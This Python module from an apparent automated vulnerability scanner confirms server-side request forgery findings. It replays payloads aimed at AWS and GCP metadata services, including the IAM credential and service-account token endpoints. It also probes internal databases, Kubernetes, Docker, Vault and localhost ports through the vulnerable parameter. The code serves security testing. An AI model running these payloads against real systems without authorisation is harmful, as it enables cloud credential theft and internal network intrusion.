"""
PHANTOM AI - SSRF Prover

Proves SSRF impact: can access internal services, cloud metadata, etc.
Extracted from scanning/exploit_proof_engine.py.
"""

from __future__ import annotations

from scanning.proof_engine.base_prover import BaseProver
from scanning.proof_engine.models import ProofResult

from utils.logger import get_logger

logger = get_logger(__name__)


class SSRFProver(BaseProver):
    """Prove SSRF impact: can access internal services, cloud metadata, etc."""

    async def prove(self, finding: dict) -> ProofResult:
        result = ProofResult()
        url = finding.get("matched_at", finding.get("host", ""))
        param = (finding.get("metadata") or {}).get("param", "")

        if not url:
            return ProofResult.not_attempted("missing_url")

        # --- Q1: Can I repeat? ---
        original_payload = (finding.get("metadata") or {}).get("payload", "")
        if original_payload and param:
            # Replay the original SSRF payload
            status, body, _ = await self._safe_request("GET", url, params={param: original_payload})
            if status in (200, 301, 302) and len(body) > 0:
                result.can_repeat = True
                result.repeat_count = 1
                self._record_vector_attempt("ssrf_repeat", True, original_payload[:50], url)
        else:
            # Try basic localhost probe
            status, body, _ = await self._safe_request("GET", url)
            if status > 0:
                result.can_repeat = True
                self._record_vector_attempt("ssrf_repeat", True, "", url)

        # --- Q2: Can I mutate? (different internal targets) ---
        if self.budget_remaining > 0 and result.can_repeat and param:
            ssrf_targets = [
                ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
                ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
                ("localhost", "http://127.0.0.1:80/"),
                ("internal", "http://192.168.1.1/"),
            ]
            for label, target in ssrf_targets:
                if self.budget_remaining <= 0:
                    break
                status, body, _ = await self._safe_request("GET", url, params={param: target})
                if status == 200 and len(body) > 50:
                    result.can_mutate = True
                    result.mutations.append(f"{label}: got {len(body)} bytes")
                    # THEME-15: Capture extracted data
                    if "ami-" in body or "instance-id" in body:
                        result.data_extracted.append("AWS metadata (instance-id, ami)")
                        result.impact_type = "DATA_LEAK"
                    if "project/" in body or "zone/" in body:
                        result.data_extracted.append("GCP metadata (project, zone)")
                        result.impact_type = "DATA_LEAK"
                    self._record_vector_attempt(f"ssrf_mutate_{label}", True, target, url)
                    break

        # --- Q3: Can I escalate? (access more sensitive endpoints) ---
        if self.budget_remaining > 0 and result.can_mutate and param:
            sensitive_targets = [
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            ]
            for target in sensitive_targets:
                if self.budget_remaining <= 0:
                    break
                status, body, _ = await self._safe_request("GET", url, params={param: target})
                if status == 200 and ("AccessKeyId" in body or "access_token" in body):
                    result.can_escalate = True
                    result.escalation = "Cloud credentials accessible via SSRF"
                    result.privilege_gained = "cloud_credentials"
                    result.impact_type = "PRIVILEGE_ESCALATION"
                    self._record_vector_attempt("ssrf_escalate_creds", True, target, url)
                    break

        # GAP-4 FIX: Prove internal service access depth
        if result.can_repeat and param:
            internal_scan = await self._prove_internal_access(url, param, result)
            if internal_scan.get("services_reachable"):
                result.proven_impact = internal_scan.get("impact_summary", "")

        # --- Q4: Can I chain? ---
        sqli_findings = self._find_related_findings(["sql_injection"])
        if sqli_findings:
            result.can_chain = True
            result.chain_targets.append("SSRF to internal DB + SQLi = backend database compromise")

        result.requests_used = self._requests_used
        return result.finalize()  # FIX P0-005: Calculate proof outcome and impact

    # =========================================================================
    # GAP-4 FIX: Internal service discovery
    # =========================================================================

    async def _prove_internal_access(self, url: str, param: str, result: ProofResult) -> dict:
        """
        GAP-4 FIX: Prove SSRF can reach internal services.

        Instead of "SSRF found", proves "SSRF reaches Redis, MySQL, K8s API".
        """
        internal_scan = {
            "services_reachable": [],
            "ports_open": [],
            "infrastructure_exposed": [],
            "impact_summary": "",
        }

        # Comprehensive list of internal service targets
        internal_targets = [
            # Databases
            ("redis", "http://127.0.0.1:6379/", ["+PONG", "ERR wrong number", "-NOAUTH"]),
            ("mysql", "http://127.0.0.1:3306/", ["mysql_native_password", "MariaDB", "5.7"]),
            ("postgres", "http://127.0.0.1:5432/", ["PostgreSQL", "FATAL"]),
            ("mongodb", "http://127.0.0.1:27017/", ["MongoDB", "ismaster"]),
            ("elasticsearch", "http://127.0.0.1:9200/", ["cluster_name", "cluster_uuid", "elasticsearch"]),

            # Container/Orchestration
            ("k8s_api", "https://kubernetes.default.svc/", ["apiVersion", "kind", "kubernetes"]),
            ("k8s_api_http", "http://kubernetes.default.svc/", ["apiVersion", "kind", "kubernetes"]),
            ("docker_api", "http://127.0.0.1:2375/version", ["ApiVersion", "Version", "Platform"]),
            ("docker_api_alt", "http://172.17.0.1:2375/version", ["ApiVersion", "Version", "Platform"]),

            # Message queues
            ("rabbitmq", "http://127.0.0.1:15672/api/overview", ["rabbitmq", "cluster_name", "erlang"]),
            ("kafka", "http://127.0.0.1:9092/", ["kafka", "broker"]),

            # Caches
            ("memcached", "http://127.0.0.1:11211/", ["STAT", "END", "memcached"]),

            # Admin interfaces
            ("consul", "http://127.0.0.1:8500/v1/agent/self", ["Config", "Member", "consul"]),
            ("vault", "http://127.0.0.1:8200/v1/sys/health", ["sealed", "cluster_name", "vault"]),
            ("etcd", "http://127.0.0.1:2379/version", ["etcdserver", "etcdcluster"]),

            # Internal web
            ("internal_web", "http://127.0.0.1:8080/", ["<html", "<!DOCTYPE", "<body"]),
            ("internal_web_alt", "http://localhost:3000/", ["<html", "<!DOCTYPE", "Express"]),
        ]

        for service_name, target, indicators in internal_targets:
            if self.budget_remaining <= 0:
                break
            try:
                status, body, _ = await self._safe_request("GET", url, params={param: target})
                if status in (200, 401, 403) and body:
                    # Check for service indicators
                    body_lower = body.lower()
                    for indicator in indicators:
                        if indicator.lower() in body_lower:
                            internal_scan["services_reachable"].append({
                                "service": service_name,
                                "target": target,
                                "indicator": indicator,
                                "status": status,
                            })
                            result.data_extracted.append(f"internal_service:{service_name}")
                            self._record_vector_attempt(f"ssrf_internal_{service_name}", True, target, url)
                            break
            except Exception as e:
                logger.debug(f"[SSRFProver] Internal probe {service_name} failed: {e}")

        # Port scan for common internal ports (if budget allows)
        if self.budget_remaining > 0:
            common_ports = [22, 80, 443, 3000, 5000, 8000, 8080, 8443, 9000]
            for port in common_ports:
                if self.budget_remaining <= 0:
                    break
                target = f"http://127.0.0.1:{port}/"
                try:
                    status, body, _ = await self._safe_request("GET", url, params={param: target})
                    if status in (200, 301, 302, 401, 403) and len(body) > 10:
                        internal_scan["ports_open"].append(port)
                except Exception:
                    pass

        # Build impact summary
        if internal_scan["services_reachable"] or internal_scan["ports_open"]:
            services = [s["service"] for s in internal_scan["services_reachable"]]
            parts = []
            if services:
                parts.append(f"SSRF reaches {len(services)} internal service(s): {', '.join(services)}")
            if internal_scan["ports_open"]:
                parts.append(f"Open ports: {', '.join(map(str, internal_scan['ports_open']))}")
            internal_scan["impact_summary"] = ". ".join(parts)

            # Categorize infrastructure exposure
            db_services = ["redis", "mysql", "postgres", "mongodb", "elasticsearch"]
            container_services = ["k8s_api", "k8s_api_http", "docker_api", "docker_api_alt"]
            for s in internal_scan["services_reachable"]:
                if s["service"] in db_services:
                    internal_scan["infrastructure_exposed"].append("database")
                    result.privilege_gained = "internal_database_access"
                if s["service"] in container_services:
                    internal_scan["infrastructure_exposed"].append("container_orchestration")
                    result.privilege_gained = "container_access"
                    result.can_escalate = True
                    result.escalation = f"SSRF reaches container infrastructure ({s['service']})"

            if not result.impact_evidence:
                result.impact_evidence = {}
            result.impact_evidence["internal_scan"] = internal_scan
            result.impact_type = "PRIVILEGE_ESCALATION"

        return internal_scan
